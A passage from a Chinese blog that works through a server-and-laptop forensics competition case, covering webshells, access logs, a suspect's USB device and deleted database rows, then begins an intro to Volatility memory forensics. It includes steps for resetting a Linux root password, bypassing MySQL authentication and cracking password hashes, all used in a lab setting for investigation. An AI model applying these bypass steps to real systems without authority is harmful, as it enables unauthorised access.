class="line"><span class="keyword">exit</span>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line">reboot&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动</span><br><span class="line">按e键进入编辑模式</span><br><span class="line">将光标移动到linux16开始的行，添加内核参数rd.<span class="keyword">break</span></span><br><span class="line">按Ctrl-x启动</span><br><span class="line">mount -o remount,rw /sysroot</span><br><span class="line">chroot /sysroot</span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root</span><br><span class="line">touch /.autorelabel</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot&nbsp;</span><br></pre></td></tr></tbody></table></figure>

<p>说实话，我没有绕，直接尝试<code>root:12456</code>组合就成功进去了。。。</p>
<p>查看Linux系统类型、详细版本号：</p>
<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>version</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/etc/</span>redhat-release</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/ertc/i</span>ssue</span><br></pre></td></tr></tbody></table></figure>

<p>linux版本号相关知识：</p>
<p>3.10.0-693.el7.x86_64<br>3：目前发布的主版本号<br>10：次版本号，偶数表示稳定版本；奇数表示开发中版本。<br>0：错误修补的次数<br>693：表示当前版本的第五次微调patch<br>el：表示多处理器</p>
<p>crontab相关命令：</p>
<p>crontab -h： 查看帮助文档<br>crontab -uroot 指定用户<br>crontab -uroot -l 查看root用户的所有crontab</p>
<p>crontab格式详解：<br>分钟（0-59） | 小时（0-23） | 日期（1-31）  | 月份（1-12） | 周（0-6，0表示周日） | 执行的命令</p>
<p>中间以空格或者是tab为界。</p>
<p><code>crontab -uroot -l 0,30 8-20 * * * chmod 755 /var/opt/gl/bac.sh 1,31 8-20 * * * /var/opt/dl/bac.sh</code></p>
<h5 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h5><p>系统类型是：Centos7 64位<br>版本号是：3.10.0-693.el7.x86_64<br>定时任务情况是：每天的8点到12点0分和30分改变/var/opt/gl/bac.sh的权限为755,1分和31分执行该文件。</p>
<h5 id="2分别列出运行的网站服务类型，监听端口，网页文件所在位置，网站访问日志位置；（5分）"><a href="#2分别列出运行的网站服务类型，监听端口，网页文件所在位置，网站访问日志位置；（5分）" class="headerlink" title="2分别列出运行的网站服务类型，监听端口，网页文件所在位置，网站访问日志位置；（5分）"></a>2分别列出运行的网站服务类型，监听端口，网页文件所在位置，网站访问日志位置；（5分）</h5><p><code>netstat -antp netstat -ano</code></p>
<p><img src="/images/pasted-11.png" alt="upload successful"></p>
<p>nginx的默认配置文件是：/etc/nginx/nginx.conf<br>nginx的默认子配置文件是：/etc/nginx/conf.d/*.conf</p>
<h6 id="可以在默认配置文件中查看子配置文件的位置，可以在子配置文件中查看监听端口号、域名（服务名）、访问日志位置、网站根目录、网站首页文件"><a href="#可以在默认配置文件中查看子配置文件的位置，可以在子配置文件中查看监听端口号、域名（服务名）、访问日志位置、网站根目录、网站首页文件" class="headerlink" title="可以在默认配置文件中查看子配置文件的位置，可以在子配置文件中查看监听端口号、域名（服务名）、访问日志位置、网站根目录、网站首页文件"></a>可以在默认配置文件中查看子配置文件的位置，可以在子配置文件中查看<code>监听端口号、域名（服务名）、访问日志位置、网站根目录、网站首页文件</code></h6><p><code>less /etc/nginx/conf.d/*.conf</code><br><img src="/images/pasted-12.png" alt="upload successful"></p>
<p>然而实际上答案不是这个，因为：<br>1.当你访问/usr/share/nginx/之后发现，里面只有两个nginx的默认文件；<br>2.参考上面的crontab之后，会发现这个目录有古怪，进去发现是一个网站的根目录，自然让人生疑。<br>3.使用<code>ps -ef | grep nginx</code>查看nginx进程调用的文件时发现，nginx没有使用默认的配置文件，而是另外选了<code>/etc/nginx/nginx.conf</code></p>
<p><img src="/images/pasted-13.png" alt="upload successful"></p>
<p>然后查看该配置文件，发现其中包含了另一个配置文件<code>/etc/nginx/conf.site.d/mm.conf</code></p>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<p>查看 mm.conf：</p>
<p><img src="/images/pasted-15.png" alt="upload successful"></p>
<p>其实这题也是做到后面第5题才发现的错误，大意疏忽了。</p>
<h5 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h5><p>网站服务类型是：nginx<br>监听端口是：80<br>网页文件所在位置是：/var/opt/gl/<br>网站访问日志：/var/log/nginx/access.log</p>
<h5 id="3-分别列出网站服务器中运行什么数据库，数据库配置文件所在位置，监听端口，有哪些账号，密码分别是什么？（10分）"><a href="#3-分别列出网站服务器中运行什么数据库，数据库配置文件所在位置，监听端口，有哪些账号，密码分别是什么？（10分）" class="headerlink" title="3.分别列出网站服务器中运行什么数据库，数据库配置文件所在位置，监听端口，有哪些账号，密码分别是什么？（10分）"></a>3.分别列出网站服务器中运行什么数据库，数据库配置文件所在位置，监听端口，有哪些账号，密码分别是什么？（10分）</h5><p><code>netstat -antp</code>查看当前使用的端口情况。</p>
<p><img src="/images/pasted-11.png" alt="upload successful"></p>
<p><code>my.cnf</code>是mysql启动时加载的配置文件，一般会放在mysql的安装目录中，用户也可以放在其他目录加载。<br>运用 <code>find / -name my.cnf</code>可以列出所有的数据库配置文件。</p>
<p>查看当前运行的mysql进程是否使用指定配置文件：<code>ps -aux | grep mysql</code>或者是<code>ps -ef | grep mysql 查看进程使用的文件</code></p>
<p>如果没有设置使用指定目录的my.cnf，mysql启动时会读取安装目录根目录及默认目录下的my.cnf文件。<br>查看mysql默认读取my.cnf的目录：<code>mysql --help | grep 'my.cnf</code></p>
<p>如果指定目录下都没有配置文件，那就是加载mysql的时候没有使用配置文件。</p>
<p>因为不知道本地数据库的密码，所以我们更换登录配置文件，使我们能够以无密码登录的状态登录进去。</p>
<figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line">systemctl stop mysqld</span><br><span class="line"></span><br><span class="line">mysqld <span class="comment">--user=root --skip-grant-tables &amp;</span></span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7以下版本</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">Password</span>=<span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> authentication_string=<span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">'root'</span>;</span><br><span class="line">#建议<span class="keyword">desc</span> <span class="keyword">user</span>；查看是<span class="keyword">password</span>还是authenticatoni_string</span><br><span class="line"></span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">restart</span> mysqld</span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></tbody></table></figure>

<h6 id="查看mysql版本号："><a href="#查看mysql版本号：" class="headerlink" title="查看mysql版本号："></a>查看mysql版本号：</h6><p>在终端下：mysql -V<br>在终端下：mysql –help | grep Distrib<br>在mysql中：mysql&gt; status;<br>在mysql中：select version();</p>
<h6 id="三种重启命令："><a href="#三种重启命令：" class="headerlink" title="三种重启命令："></a>三种重启命令：</h6><p>/etc/init.d/mysqld restart<br>systemctl restart mysql<br>service mysqld restart</p>
<h6 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h6><p>口令：<br>如果为空，则对应用户没有口令，登录时不需要口令；<br>星号代表帐号被锁定；<br>双叹号表示这个密码已经过期了；<br>$6$开头的，表明是用SHA-512加密；<br>$1$表明是用MD5加密；<br>$2$&nbsp;是用Blowfish加密；<br>$5$&nbsp;是用 SHA-256加密；</p>
<p>成功进入数据库后，直接输入</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/pasted-16.png" alt="upload successful"></p>
<p>C6B2B8EC628390A22B99AB0609E5E70A0F962E9F</p>
<p>23AE809DDACAF96AF0FD78ED04B6A265E05AA257 </p>
<p>使用MD5爆破得：<br>root：123<br>sae_user：ming</p>
<h5 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h5><p>网站服务器运行数据库：mysqld<br>数据库配置文件所在位置：/etc/my.cnf<br>监听端口：3306<br>账号和密码是：root : 123、sae_user : ming</p>
<h5 id="4-尝试启动访问该网站并固定网站首页，简述该网站登录密码的获取方式。（10分）"><a href="#4-尝试启动访问该网站并固定网站首页，简述该网站登录密码的获取方式。（10分）" class="headerlink" title="4.尝试启动访问该网站并固定网站首页，简述该网站登录密码的获取方式。（10分）"></a>4.尝试启动访问该网站并固定网站首页，简述该网站登录密码的获取方式。（10分）</h5><p><code>ifconfig</code>查看Centos的IP地址为：192.168.213.136<br>由上可知：nginx的监听端口是80。<br>直接在宿主机浏览器输入：192.168.213.136:80<br>如下图：</p>
<p><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>查询数据库mysite：<br>破解MD5值得到<code>admin：admin</code><br>尝试登陆：</p>
<p><img src="/images/pasted-18.png" alt="upload successful"></p>
<h5 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h5><p>利用之前解密的root账户登录进数据库，在mysite库中获取admin密码为admin，登录成功。</p>
<h5 id="5-嫌疑人使用的笔记本中，能够确认的与本次入侵相关的痕迹最早是在什么时间？（5分）"><a href="#5-嫌疑人使用的笔记本中，能够确认的与本次入侵相关的痕迹最早是在什么时间？（5分）" class="headerlink" title="5.嫌疑人使用的笔记本中，能够确认的与本次入侵相关的痕迹最早是在什么时间？（5分）"></a>5.嫌疑人使用的笔记本中，能够确认的与本次入侵相关的痕迹最早是在什么时间？（5分）</h5><p>使用取证大师：<br>其实也是可以尝试仿真，qemu格式转化，反正是备赛，权当复习一下。但是火眼仿真是真的香。</p>
<p>恢复虚拟机快照，使用last 查看服务器最近登录记录，近期均为本机登录，使用lastb查看登录失败记录，未见异常。</p>
<p><img src="/images/pasted-47.png" alt="upload successful"></p>
<p><img src="/images/pasted-48.png" alt="upload successful"></p>
<p>注意：是从嫌疑人的电脑中，实际上查看嫌疑人的电脑的浏览记录中可以翻到相关的写马记录：</p>
<h5 id="解答：-4"><a href="#解答：-4" class="headerlink" title="解答："></a>解答：</h5><p>最早的时候是2018年1月4号15:37:21。</p>
<h5 id="6-一个疑似被用于入侵的存储设备在现场没被找到，列出可能名称和序列号。（5分）"><a href="#6-一个疑似被用于入侵的存储设备在现场没被找到，列出可能名称和序列号。（5分）" class="headerlink" title="6.一个疑似被用于入侵的存储设备在现场没被找到，列出可能名称和序列号。（5分）"></a>6.一个疑似被用于入侵的存储设备在现场没被找到，列出可能名称和序列号。（5分）</h5><p>根据取证大师里的USB设备连接相关的记录可以发现：<br>该计算机曾经连接过两个可疑的USB大储量设备，结合陈某是6月24号左右离职的，所以，大概率是一个金士顿的USB移动存储设备。</p>
<p><img src="/images/pasted-19.png" alt="upload successful"></p>
<h5 id="解答：-5"><a href="#解答：-5" class="headerlink" title="解答："></a>解答：</h5><p>可能的设备名称和对应的序列号是<code>Kingston DataTraveler 2.0 USB Device</code>和<code>1ee045c2-784b-11e7-a2f6-000c29f17239</code></p>
<h5 id="7．服务器中history命令没有响应，分析其可能原因并列出相关线索。（10分）"><a href="#7．服务器中history命令没有响应，分析其可能原因并列出相关线索。（10分）" class="headerlink" title="7．服务器中history命令没有响应，分析其可能原因并列出相关线索。（10分）"></a>7．服务器中history命令没有响应，分析其可能原因并列出相关线索。（10分）</h5><p>因为之前看到crontab中的命令，执行的命令中有一条是将history命令记录文件移动到<code>/var/opt/gl/save</code>下的隐藏文件<code>.his备份</code>中。</p>
<p><img src="/images/pasted-20.png" alt="upload successful"></p>
<p><img src="/images/pasted-35.png" alt="upload successful"></p>
<p>注意到权限问题，这是值得思考</p>
<p>查看备份文件：</p>
<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<h5 id="解答：-6"><a href="#解答：-6" class="headerlink" title="解答："></a>解答：</h5><p>因为嫌疑人已经把历史命令备份到了相关的文件中，线索如上。</p>
<h5 id="8-嫌疑人是否通过命令行方式管理过数据库？找到相关线索。（5分）"><a href="#8-嫌疑人是否通过命令行方式管理过数据库？找到相关线索。（5分）" class="headerlink" title="8.嫌疑人是否通过命令行方式管理过数据库？找到相关线索。（5分）"></a>8.嫌疑人是否通过命令行方式管理过数据库？找到相关线索。（5分）</h5><p>通过快照恢复之后，查询数据库是否启用mysql&gt;show variables like ‘log_bin’：</p>
<p><img src="/images/pasted-37.png" alt="upload successful"><br>很好，没有开启。</p>
<p>查看数据库配置文件：</p>
<p><img src="/images/pasted-36.png" alt="upload successful"></p>
<p>查看导出的honglian.log可以看到：从数据库密码于一些基本路径等推断为服务器被转移的历史命令记录，并发现曾导出数据库数据至/mysite.sql，并且嫌疑人曾以命令行管理过数据库。</p>
<p>另外：Honglian.log修改时间为6月24日12:57分，推测转移时间为中午。</p>
<p><img src="/images/pasted-44.png" alt="upload successful"></p>
<p><img src="/images/pasted-40.png" alt="upload successful"></p>
<p><img src="/images/pasted-41.png" alt="upload successful"></p>
<p><img src="/images/pasted-43.png" alt="upload successful"></p>
<h5 id="解答：-7"><a href="#解答：-7" class="headerlink" title="解答："></a>解答：</h5><p>嫌疑人曾经使用过命令行的方式管理过数据库。</p>
<h5 id="9-分析E盘中文件的可能来源，并计算其md5值。（10分）"><a href="#9-分析E盘中文件的可能来源，并计算其md5值。（10分）" class="headerlink" title="9.分析E盘中文件的可能来源，并计算其md5值。（10分）"></a>9.分析E盘中文件的可能来源，并计算其md5值。（10分）</h5><p>首先发现了E盘是bitlocker加密的，通过搜寻的秘钥直接可以解密，解密之后，挂载，发现只有一个文件夹，里面内容有两个。</p>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<p>其中，MD5值为：</p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>查看服务器根目录下的mysite.sql,计算md5哈希值，与嫌疑人笔记本电脑中的mysite.sql一致，遂确认嫌疑人笔记本电脑中的mysite.sql来源为服务器。</p>
<p><img src="/images/pasted-50.png" alt="upload successful"></p>
<h5 id="解答：-8"><a href="#解答：-8" class="headerlink" title="解答："></a>解答：</h5><p>mysite.sql：DC6DC637E56EAF805636467A777D4632<br>hongliang.log：A7CD80DFFD896085F4BE9FA104710981</p>
<p>mysite.sql虽然在站点文件夹中发现该文件，但是从站点文件夹中拷贝的详细过程有待深究。<br>hongliang可以从上一题中的备份history文件中得到来源线索，是从移动设备中拷出来的。</p>
<p>尝试利用<code>NTFS log tracker</code>查看该磁盘操作日志，但是没有在<code>$extend</code>下找到<code>$J</code>，作罢。<br>附上<code>NTFS log tracker</code>的使用指导：</p>
<p><a href="http://forensicinsight.org/wp-content/uploads/2013/06/F-INSIGHT-NTFS-Log-TrackerEnglish.pdf">http://forensicinsight.org/wp-content/uploads/2013/06/F-INSIGHT-NTFS-Log-TrackerEnglish.pdf</a></p>
<h5 id="10-服务器中存在哪些恶意程序，分别是如何上传至服务器的。-（15分）"><a href="#10-服务器中存在哪些恶意程序，分别是如何上传至服务器的。-（15分）" class="headerlink" title="10.服务器中存在哪些恶意程序，分别是如何上传至服务器的。 （15分）"></a>10.服务器中存在哪些恶意程序，分别是如何上传至服务器的。 （15分）</h5><p>在站点文件夹中，有两个可执行文件十分显眼：</p>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>一个是陈某留下的备份sh脚本；另一个查看可以发现在头部多了一个php语句：</p>
<p><img src="/images/pasted-25.png" alt="upload successful"><br>遂怀疑是拼接一句话木马，发现nginx的访问日志<code>/var/log/nginx/access.log</code>被清空了。</p>
<p>对虚拟机快照恢复，再次访问该日志文件：</p>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
<p>对<code>footer.php</code>查询：</p>
<p><img src="/images/pasted-29.png" alt="upload successful"></p>
<p>对第一条命令中的参数base64解密：</p>
<p><img src="/images/pasted-32.png" alt="upload successful"></p>
<p><img src="/images/pasted-33.png" alt="upload successful"></p>
<p>很明显，写入一句话木马到c.php。</p>
<p>对第三条语句中的参数base64解密：</p>
<p><img src="/images/pasted-34.png" alt="upload successful"></p>
<p>在hlj.php中写入一句话木马。</p>
<p>第五题的答案迎刃而解。</p>
<p>对<code>heb.php</code>查询：</p>
<p><img src="/images/pasted-30.png" alt="upload successful"></p>
<p>发现对数据库中的特定库中的特定表select出来了。</p>
<p>另外，对网站进行复现还原，也可以直接定位<code>heb.php</code>的详细作用—-用于数据库的增删改查。</p>
<p><img src="/images/pasted-54.png" alt="upload successful"></p>
<p><img src="/images/pasted-66.png" alt="upload successful"></p>
<p>在嫌疑人xise菜刀同目录下发现heb.php,校验md5哈希值与服务器上脚本一致，推断通过xise菜刀软件上传。</p>
<p><img src="/images/pasted-56.png" alt="upload successful"></p>
<p>同样值得注意的是：<code>footer.php</code>是命令执行文件，根据web access日志和服务器历史命令日志和文件拥有者是root这三点可以推断是陈某运维时利用root账户上传的，一直存在于服务器上。而恶意脚本<code>hlj.php</code>就是利用<code>footer.php</code>生成的。</p>
<p>在取证大师中，对C盘进行卷影分析，恢复出了4个C盘记录，在当前和分析的桌面目录下找到了相关的文件：</p>
<p><img src="/images/pasted-27.png" alt="upload successful"></p>
<p><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>XISE菜刀是webshell管理工具,jsc.mdb是菜刀的access数据库文件；heb.php是管理数据库的php文件。</p>
<p>对xise菜刀的还原：<br>发现嫌疑人存在对192.168.50.134的webshell hlj.php的连接记录：</p>
<p><img src="/images/pasted-59.png" alt="upload successful"></p>
<p>SAMInside是提权工具。可以通过此工具得到登录用户的NTLM哈希值，随后爆破可得密码。</p>
<p>注意：实际上可以直接使用D盾对整个网站的源码进行扫描，可以很清楚看见恶意文件为footer.php和hlj.php：</p>
<p><img src="/images/pasted-60.png" alt="upload successful"></p>
<p><img src="/images/pasted-61.png" alt="upload successful"></p>
<h5 id="解答：-9"><a href="#解答：-9" class="headerlink" title="解答："></a>解答：</h5><p>恶意文件有：</p>
<p>hlj.php：通过footer.php写入，一句话木马。</p>
<p>c.php：通过footer.php写入，一句话木马。</p>
<p>heb.php：数据库管理脚本，推测为嫌疑人使用xise菜刀连接hlj.php上传。</p>
<p>footer.php：命令执行，因为文件拥有者是root，怀疑是陈某运维时利用root账户上传的。</p>
<h5 id="11-嫌疑人是否通过恶意程序从服务器端获取了数据库中的数据，固定相关线索。（10分）"><a href="#11-嫌疑人是否通过恶意程序从服务器端获取了数据库中的数据，固定相关线索。（10分）" class="headerlink" title="11.嫌疑人是否通过恶意程序从服务器端获取了数据库中的数据，固定相关线索。（10分）"></a>11.嫌疑人是否通过恶意程序从服务器端获取了数据库中的数据，固定相关线索。（10分）</h5><p><img src="/images/pasted-31.png" alt="upload successful"></p>
<p>根据access.log可以清楚地得到，陈某利用heb.php文件对网站数据库中数据进行获取。</p>
<p>查看access文件，发现存在大量192.168.50.133连接hlh.php记录，且UA信息与其他访问不同，推断为xise菜刀连接记录，根据mysite.sql文件创建时间推断嫌疑人与15:53分使用xise菜刀获取数据库数据文件。在17:45分出现连接heb.php记录。</p>
<p><img src="/images/pasted-52.png" alt="upload successful"></p>
<p><img src="/images/pasted-53.png" alt="upload successful"></p>
<h5 id="解答：-10"><a href="#解答：-10" class="headerlink" title="解答："></a>解答：</h5><p>是，嫌疑人通过heb.php获取了数据库中的mysite库中的contract表的数据。</p>
<p><img src="/images/pasted-31.png" alt="upload successful"></p>
<h5 id="12-嫌疑人本次删除了多少条数据库记录，可能是什么时间，通过何种方式删除的。（10分）"><a href="#12-嫌疑人本次删除了多少条数据库记录，可能是什么时间，通过何种方式删除的。（10分）" class="headerlink" title="12.嫌疑人本次删除了多少条数据库记录，可能是什么时间，通过何种方式删除的。（10分）"></a>12.嫌疑人本次删除了多少条数据库记录，可能是什么时间，通过何种方式删除的。（10分）</h5><p>利用嫌疑人电脑里面的<code>mysite.sql</code>还原出数据库书籍文件，对比现有数据库文件中的数据，可以发现表contract中数据缺失49条。</p>
<p><img src="/images/pasted-39.png" alt="upload successful"></p>
<p><img src="/images/pasted-62.png" alt="upload successful"></p>
<p>并且分析嫌疑人的浏览器记录，发现url记录与服务器access.log对应：</p>
<p><img src="/images/pasted-63.png" alt="upload successful"></p>
<p><img src="/images/pasted-64.png" alt="upload successful"></p>
<p>嫌疑人在6月24日17:45左右连接heb.php对表contratc进行操作。推断使用heb.php删除数据。</p>
<h5 id="解答：-11"><a href="#解答：-11" class="headerlink" title="解答："></a>解答：</h5><p>删除了49条数据，可能时间是6月24日17:45左右，通过heb.php脚本的方式管理数据。</p>
<h3 id="案件时间线："><a href="#案件时间线：" class="headerlink" title="案件时间线："></a>案件时间线：</h3><h5 id="2018年6月24日中午"><a href="#2018年6月24日中午" class="headerlink" title="2018年6月24日中午"></a>2018年6月24日中午</h5><p>嫌疑人使用服务器连接个人usb存储设备将.bash_history文件转移至存储设备并保存为honglian.log，并将footer.php木马文件上传至服务器web目录。Honglian.log最后被转移到嫌疑人笔记本加密盘E盘中</p>
<h5 id="2018年6月24日15-30-16-00"><a href="#2018年6月24日15-30-16-00" class="headerlink" title="2018年6月24日15:30-16:00"></a>2018年6月24日15:30-16:00</h5><p>电脑设置了计划任务进行.bash_history转移</p>
<h5 id="2018年6月24日16-01"><a href="#2018年6月24日16-01" class="headerlink" title="2018年6月24日16:01"></a>2018年6月24日16:01</h5><p>计划任务将最后的.bash_history转移</p>
<h5 id="2018年6月24日15-52分左右"><a href="#2018年6月24日15-52分左右" class="headerlink" title="2018年6月24日15:52分左右"></a>2018年6月24日15:52分左右</h5><p>嫌疑人使用webshell footer.php生成木马文件hlj.php</p>
<h5 id="2018年6月24日15-50-17-45"><a href="#2018年6月24日15-50-17-45" class="headerlink" title="2018年6月24日15:50-17:45"></a>2018年6月24日15:50-17:45</h5><p>嫌疑人使用xise菜刀连接webshell,下载数据库数据文件mysite.sql,上传数据库管理脚本heb.php，mysite.sql存储于嫌疑人笔记本电脑加密盘E盘中</p>
<h5 id="2018年6月24日17-45-17-50"><a href="#2018年6月24日17-45-17-50" class="headerlink" title="2018年6月24日17:45-17:50"></a>2018年6月24日17:45-17:50</h5><p>嫌疑人使用heb.php脚本删除mysite数据库中contract表数据49条</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
  </entry>
  <entry>
    <title>内存取证入门</title>
    <url>/%E5%8F%96%E8%AF%81%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="Volatility的基本介绍"><a href="#Volatility的基本介绍" class="headerlink" title="Volatility的基本介绍"></a>Volatility的基本介绍</h3><p>Volatility是一款基于GNU协议的开源框架，使用Python语言编写而成的内存取证工具集，可以分析内存中的各种数据。Volatility支持对32位或64位Wnidows、Linux、Mac、Android操作系统的RAM（随机存储器）数据进行提取与分析。</p>
<h3 id="内存镜像的获取"><a href="#内存镜像的获取" class="headerlink" title="内存镜像的获取"></a>内存镜像的获取</h3><p><code>MoonSols DumpIt</code>是一款同时支持Win32dd和Win64dd的内存副本获取工具。用户只需双击DumpIt.exe可执行程序，并在提示问题后面输入y（如图2.2所示），等待几分钟时间即可在当前目录下生成主机物理内存的副本（如图2.3所示），该副本文件是以*.raw为后缀的镜像文件。</p>
<p>raw是未经处理的意思，即使用该工具对物理内存进行拷贝是按每一个bit进行深度复制，即按原样进行复制，这样可以避免丢失一些重要数据。</p>
<p>拿到一个镜像文件，在cmd进入所在目录，输入:</p>
<pre><code>    .\volatility  -f &lt;memdump.img&gt; imageinfo</code></pre>
<h5 id="Suggested-profiles：策略，会告诉你这个内存镜像可以使用什么策略，策略通过imageinfo命令获取。"><a href="#Suggested-profiles：策略，会告诉你这个内存镜像可以使用什么策略，策略通过imageinfo命令获取。" class="headerlink" title="Suggested profiles：策略，会告诉你这个内存镜像可以使用什么策略，策略通过imageinfo命令获取。"></a>Suggested profiles：策略，会告诉你这个内存镜像可以使用什么策略，策略通过<code>imageinfo</code>命令获取。</h5><p>使用策略方法：</p>
<pre><code>    .\volatility  -f &lt;memdump.img&gt; --profile=Win7SP1x64</code></pre>
<h4 id="查看镜像信息："><a href="#查看镜像信息：" class="headerlink" title="查看镜像信息："></a>查看镜像信息：</h4><pre><code>    -f &lt;memdump.img&gt; imageinfo</code></pre>
<h5 id="显示主机所使用的操作系统版本、服务包以及硬件结构-32位或64位-、页目录表的起始地址和该获取该内存镜像的时间等基本信息"><a href="#显示主机所使用的操作系统版本、服务包以及硬件结构-32位或64位-、页目录表的起始地址和该获取该内存镜像的时间等基本信息" class="headerlink" title="显示主机所使用的操作系统版本、服务包以及硬件结构(32位或64位)、页目录表的起始地址和该获取该内存镜像的时间等基本信息"></a>显示主机所使用的操作系统版本、服务包以及硬件结构(32位或64位)、页目录表的起始地址和该获取该内存镜像的时间等基本信息</h5><h4 id="查找内存中KPCR的-KPCR结构体信息："><a href="#查找内存中KPCR的-KPCR结构体信息：" class="headerlink" title="查找内存中KPCR的_KPCR结构体信息："></a>查找内存中KPCR的_KPCR结构体信息：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; kprcscan                        需要好几个小时。</code></pre>
<p>在_KPCR的帮助下我们可以枚举机器上运行的进程列表。</p>
<p>由于Windows需要支持多个CPU，因此Windows内核中为此定义了一套以处理器控制区(Processor Control Region)即KPCR为枢纽的数据结构，使每个CPU都有个KPCR。 其中KPCR这个结构中有一个域KPRCB(Kernel Processor Control Block)结构，这个结构扩展了KPCR，这两个结构用来保存<strong>与线程切换相关的全局信息。</strong></p>
<p>具体的说，该命令可以显示每个处理器的详细信息，<strong>包括IDT（线程控制符）和GDT（全局段描述符表）地址，当前运行的线程和空闲线程，CPU数量、制造厂商及其速度，CR3寄存器或页目录表基地址的值等信息。</strong></p>
<pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; kpcrscan</code></pre>
<h4 id="查看进程："><a href="#查看进程：" class="headerlink" title="查看进程："></a>查看进程：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; pslist
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; pstree
    以树的形式显示出来
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; psscan
    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; psxview</code></pre>
<h5 id="pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。"><a href="#pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。" class="headerlink" title="pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。"></a>pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。</h5><h5 id="psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。"><a href="#psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。" class="headerlink" title="psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。"></a>psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。</h5><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; psscan</code></pre>
